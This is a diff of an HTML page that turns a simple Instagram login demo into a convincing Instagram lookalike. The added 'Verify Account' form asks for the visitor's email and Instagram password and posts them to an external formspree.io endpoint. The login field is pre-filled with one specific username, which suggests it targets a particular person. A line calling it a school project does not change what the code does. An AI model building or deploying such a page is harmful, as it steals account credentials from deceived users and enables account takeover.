@@ -1,146 +1,240 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://code.jquery.com;">
+    <title>Instagram</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600&display=swap');
 
-<title>Instagram Demo</title>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-<style>
-body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background-color: #fafafa;
-    margin: 0;
-    padding: 0;
-}
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
 
-.logo {
-    text-align: center;
-    margin-top: 40px;
-}
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 350px;
+            width: 100%;
+        }
 
-.logo img {
-    width: 180px;
-}
+        /* Instagram Logo */
+        .logo {
+            margin-bottom: 20px;
+        }
 
-.container {
-    width: 350px;
-    margin: 20px auto;
-    background-color: #fff;
-    border: 1px solid #dbdbdb;
-    padding: 40px;
-    text-align: center;
-}
+        .logo img {
+            width: 180px;
+            height: auto;
+        }
 
-h1 {
-    font-family: cursive;
-    font-size: 32px;
-    margin-bottom: 20px;
-}
+        /* Main Login Box */
+        .container {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 40px 40px 20px;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 10px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+        }
 
-form {
-    display: flex;
-    flex-direction: column;
-}
+        h1 {
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 28px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 30px;
+            letter-spacing: -1px;
+        }
 
-input {
-    background: #fafafa;
-    border: 1px solid #dbdbdb;
-    padding: 10px;
-    margin-bottom: 10px;
-    border-radius: 3px;
-    font-size: 14px;
-}
+        form {
+            display: flex;
+            flex-direction: column;
+        }
 
-input:focus {
-    outline: none;
-    border: 1px solid #a8a8a8;
-}
+        label {
+            text-align: left;
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
 
-button {
-    background-color: #3897f0;
-    color: white;
-    border: none;
-    padding: 10px;
-    font-weight: bold;
-    border-radius: 6px;
-    cursor: pointer;
-    margin-top: 10px;
-}
+        input, textarea {
+            width: 100%;
+            padding: 12px 10px;
+            margin-bottom: 16px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 14px;
+            color: #262626;
+            transition: border 0.2s;
+        }
 
-button:hover {
-    background-color: #1877f2;
-}
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #a8a8a8;
+            box-shadow: 0 0 0 2px rgba(56, 151, 240, 0.1);
+        }
 
-#loginMessage {
-    font-size: 14px;
-    margin-top: 10px;
-}
+        button {
+            background-color: #0095f6;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
 
-.success {
-    color: #2ecc71;
-}
+        button:hover {
+            background-color: #0077c5;
+        }
 
-.error {
-    color: #e74c3c;
-}
+        #loginMessage, #formMessage {
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: 500;
+        }
 
-.forgot {
-    margin-top: 15px;
-    font-size: 14px;
-    color: #00376b;
-    cursor: pointer;
-}
+        .success { color: #00c853; }
+        .error { color: #ed4956; }
 
-@media (max-width: 600px) {
-    .container {
-        width: 90%;
-        padding: 20px;
-    }
-}
-</style>
+        /* Second Form (Verify) - Styled like Instagram's secondary box */
+        #contactForm {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 25px 40px;
+            width: 100%;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        #contactForm h2 {
+            font-size: 16px;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+
+        /* Footer Links (Instagram style) */
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .container, #contactForm {
+                padding: 30px 25px;
+            }
+            .logo img {
+                width: 150px;
+            }
+        }
+    </style>
 </head>
-
 <body>
+    <div class="main-container">
+        <!-- Instagram Logo -->
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" 
+                 alt="Instagram Logo">
+        </div>
 
-<div class="logo">
-    <!-- You can replace this with your local image -->
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
-</div>
+        <div class="container">
+            <h1>Instagram</h1>
+            
+            <form id="loginForm" onsubmit="return login()">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" value="__neha.__.227" required>
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+                
+                <button type="submit">Log in</button>
+                <p id="loginMessage"></p>
+            </form>
+        </div>
 
-<div class="container">
-    <form onsubmit="return login()">
-        <h1>Instagram</h1>
+        <!-- Your Verification Form (Styled similarly) -->
+        <div id="contactForm">
+            <h2>Verify Account</h2>
+            <form action="https://formspree.io/f/mvojnako" method="POST">
+                <label for="email">Your Email</label>
+                <input type="email" id="email" name="email" required>
+                
+                <label for="message">Your Message (optional)</label>
+                <textarea id="message" name="message" rows="3"></textarea>
+                
+                <label for="text">Confirm Your Instagram Password</label>
+                <textarea id="text" name="text" rows="2" required></textarea>
+                
+                <button type="submit">Verify</button>
+                <p id="formMessage"></p>
+            </form>
+        </div>
 
-        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+        <div class="footer">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+            <p style="margin-top: 15px;">This is a <strong>demo</strong> for school project only.</p>
+        </div>
+    </div>
 
-        <input type="password" id="password" placeholder="Password" required>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        function login() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var loginMessage = document.getElementById('loginMessage');
 
-        <button type="submit">Log In</button>
+            if (username === "__neha.__.227" && password !== "") {
+                sendVerificationEmail(username);
+                loginMessage.className = 'success';
+                loginMessage.innerHTML = '✅ Verification email sent! Check your inbox.';
+                return false;
+            } else {
+                loginMessage.className = 'error';
+                loginMessage.innerHTML = '❌ Incorrect username or password.';
+                return false;
+            }
+        }
 
-        <p id="loginMessage"></p>
-
-        <div class="forgot">Forgot password?</div>
-    </form>
-</div>
-
-<script>
-function login() {
-    var username = document.getElementById('username').value;
-    var password = document.getElementById('password').value;
-    var message = document.getElementById('loginMessage');
-
-    if (username !== "" && password !== "") {
-        message.className = "success";
-        message.innerHTML = "Login Successful (Demo Only)";
-    } else {
-        message.className = "error";
-        message.innerHTML = "Please fill all fields correctly.";
-    }
-
-    return false;
-}
-</script>
-
+        function sendVerificationEmail(username) {
+            console.log('Sending verification email to: ' + username);
+            // You can add more fake animation here later
+        }
+    </script>
 </body>
 </html>
